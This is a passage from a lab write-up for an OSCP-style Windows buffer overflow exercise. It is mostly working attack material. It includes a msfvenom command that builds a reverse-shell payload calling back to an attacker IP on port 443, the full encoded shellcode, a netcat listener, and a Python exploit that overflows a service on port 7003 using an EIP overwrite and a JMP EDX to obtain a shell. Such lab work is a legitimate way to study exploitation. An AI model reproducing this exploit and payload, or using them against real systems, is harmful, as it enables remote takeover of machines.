![c5bf9a6cf23c02beb8535d30b241e6e2.png](3c04fa55594a4043ba1e58ccaad8c0ef.png)

Press F7 and we see we are at the beginning of the EDX register.
![19caaecae0398a248a10edc42e1021e7.png](ae4a25e707d2480f9a81b4ea57c7c393.png)
Follow EDX 00581fb8 in dump, and we see the ample space for shellcode.
![08b7a1345c23b587270acec54a172e55.png](251bd4920ac14a48b828866de318a0ce.png)

## Generate shellcode
```plaintext
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\xc5"
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
"\xba\x50\x3e\xd8\x88\xdb\xd8\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x0e\x03\x03\x30\x3a\x7d\x5f\xa4\x38"
"\x7e\x9f\x35\x5d\xf6\x7a\x04\x5d\x6c\x0f\x37\x6d\xe6\x5d\xb4"
"\x06\xaa\x75\x4f\x6a\x63\x7a\xf8\xc1\x55\xb5\xf9\x7a\xa5\xd4"
"\x79\x81\xfa\x36\x43\x4a\x0f\x37\x84\xb7\xe2\x65\x5d\xb3\x51"
"\x99\xea\x89\x69\x12\xa0\x1c\xea\xc7\x71\x1e\xdb\x56\x09\x79"
"\xfb\x59\xde\xf1\xb2\x41\x03\x3f\x0c\xfa\xf7\xcb\x8f\x2a\xc6"
"\x34\x23\x13\xe6\xc6\x3d\x54\xc1\x38\x48\xac\x31\xc4\x4b\x6b"
"\x4b\x12\xd9\x6f\xeb\xd1\x79\x4b\x0d\x35\x1f\x18\x01\xf2\x6b"
"\x46\x06\x05\xbf\xfd\x32\x8e\x3e\xd1\xb2\xd4\x64\xf5\x9f\x8f"
"\x05\xac\x45\x61\x39\xae\x25\xde\x9f\xa5\xc8\x0b\x92\xe4\x84"
"\xf8\x9f\x16\x55\x97\xa8\x65\x67\x38\x03\xe1\xcb\xb1\x8d\xf6"
"\x2c\xe8\x6a\x68\xd3\x13\x8b\xa1\x10\x47\xdb\xd9\xb1\xe8\xb0"
"\x19\x3d\x3d\x16\x49\x91\xee\xd7\x39\x51\x5f\xb0\x53\x5e\x80"
"\xa0\x5c\xb4\xa9\x4b\xa7\x5f\x16\x23\xd0\x49\xfe\x36\x1e\x77"
"\x44\xbf\xf8\x1d\xaa\x96\x53\x8a\x53\xb3\x2f\x2b\x9b\x69\x4a"
"\x6b\x17\x9e\xab\x22\xd0\xeb\xbf\xd3\x10\xa6\x9d\x72\x2e\x1c"
"\x89\x19\xbd\xfb\x49\x57\xde\x53\x1e\x30\x10\xaa\xca\xac\x0b"
"\x04\xe8\x2c\xcd\x6f\xa8\xea\x2e\x71\x31\x7e\x0a\x55\x21\x46"
"\x93\xd1\x15\x16\xc2\x8f\xc3\xd0\xbc\x61\xbd\x8a\x13\x28\x29"
"\x4a\x58\xeb\x2f\x53\xb5\x9d\xcf\xe2\x60\xd8\xf0\xcb\xe4\xec"
"\x89\x31\x95\x13\x40\xf2\xa5\x59\xc8\x53\x2e\x04\x99\xe1\x33"
"\xb7\x74\x25\x4a\x34\x7c\xd6\xa9\x24\xf5\xd3\xf6\xe2\xe6\xa9"
"\x67\x87\x08\x1d\x87\x82";
```

Start a netcat listener
```plaintext
kali@kali:~$ sudo nc -lnvp 443
[sudo] password for kali: 
listening on [any] 443 ...
```

Run the exploit (you can have a breakpoint on it, but you'll have to step through the code before you get a shell). In my case, I just launched the app and didn't open the debugger. Here is the code:
```python
kali@kali:~/gitWorkspace/pwk/oscpExercises/11_windowsBufferOverflow/vuln3$ cat 6_add_shellcode_yes_nops.py 
#!/usr/bin/python
import socket

# msfvenom -p windows/shell_reverse_tcp lhost=192.168.119.214 lport=443 -f c -e x86/shikata_ga_nai -b "\x00\xc5"
shellcode = ("\xba\x50\x3e\xd8\x88\xdb\xd8\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
"\x52\x83\xc3\x04\x31\x53\x0e\x03\x03\x30\x3a\x7d\x5f\xa4\x38"
"\x7e\x9f\x35\x5d\xf6\x7a\x04\x5d\x6c\x0f\x37\x6d\xe6\x5d\xb4"
"\x06\xaa\x75\x4f\x6a\x63\x7a\xf8\xc1\x55\xb5\xf9\x7a\xa5\xd4"
"\x79\x81\xfa\x36\x43\x4a\x0f\x37\x84\xb7\xe2\x65\x5d\xb3\x51"
"\x99\xea\x89\x69\x12\xa0\x1c\xea\xc7\x71\x1e\xdb\x56\x09\x79"
"\xfb\x59\xde\xf1\xb2\x41\x03\x3f\x0c\xfa\xf7\xcb\x8f\x2a\xc6"
"\x34\x23\x13\xe6\xc6\x3d\x54\xc1\x38\x48\xac\x31\xc4\x4b\x6b"
"\x4b\x12\xd9\x6f\xeb\xd1\x79\x4b\x0d\x35\x1f\x18\x01\xf2\x6b"
"\x46\x06\x05\xbf\xfd\x32\x8e\x3e\xd1\xb2\xd4\x64\xf5\x9f\x8f"
"\x05\xac\x45\x61\x39\xae\x25\xde\x9f\xa5\xc8\x0b\x92\xe4\x84"
"\xf8\x9f\x16\x55\x97\xa8\x65\x67\x38\x03\xe1\xcb\xb1\x8d\xf6"
"\x2c\xe8\x6a\x68\xd3\x13\x8b\xa1\x10\x47\xdb\xd9\xb1\xe8\xb0"
"\x19\x3d\x3d\x16\x49\x91\xee\xd7\x39\x51\x5f\xb0\x53\x5e\x80"
"\xa0\x5c\xb4\xa9\x4b\xa7\x5f\x16\x23\xd0\x49\xfe\x36\x1e\x77"
"\x44\xbf\xf8\x1d\xaa\x96\x53\x8a\x53\xb3\x2f\x2b\x9b\x69\x4a"
"\x6b\x17\x9e\xab\x22\xd0\xeb\xbf\xd3\x10\xa6\x9d\x72\x2e\x1c"
"\x89\x19\xbd\xfb\x49\x57\xde\x53\x1e\x30\x10\xaa\xca\xac\x0b"
"\x04\xe8\x2c\xcd\x6f\xa8\xea\x2e\x71\x31\x7e\x0a\x55\x21\x46"
"\x93\xd1\x15\x16\xc2\x8f\xc3\xd0\xbc\x61\xbd\x8a\x13\x28\x29"
"\x4a\x58\xeb\x2f\x53\xb5\x9d\xcf\xe2\x60\xd8\xf0\xcb\xe4\xec"
"\x89\x31\x95\x13\x40\xf2\xa5\x59\xc8\x53\x2e\x04\x99\xe1\x33"
"\xb7\x74\x25\x4a\x34\x7c\xd6\xa9\x24\xf5\xd3\xf6\xe2\xe6\xa9"
"\x67\x87\x08\x1d\x87\x82")

try:
  print "\nSending evil buffer..."
  nop_sled = "\x90" * 16
  filler = "B" * (2080 - len(nop_sled) - len(shellcode))
  eip = "\x1e\x11\x80\x14" # 0x1480111e
  first_stage = "\xff\xe2"  # JMP EDX -> ffe2
  nop_pad  = "\x90" * (2100 - len(nop_sled) - len(shellcode) - len(filler) - len(eip) - len(first_stage))
  inputBuffer = nop_sled + shellcode + filler + eip + first_stage + nop_pad

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.214.10", 7003))
  s.send(inputBuffer)
  
  s.close()

  print "\nDone!"
  
except:
  print "\nCould not connect!"
```

Notice we have a shell on the Kali netcat listener
![80dc6137af58c638cd5284ae6ebefdd7.png](310e40a8d3bc4fa38399e99f16856afb.png)


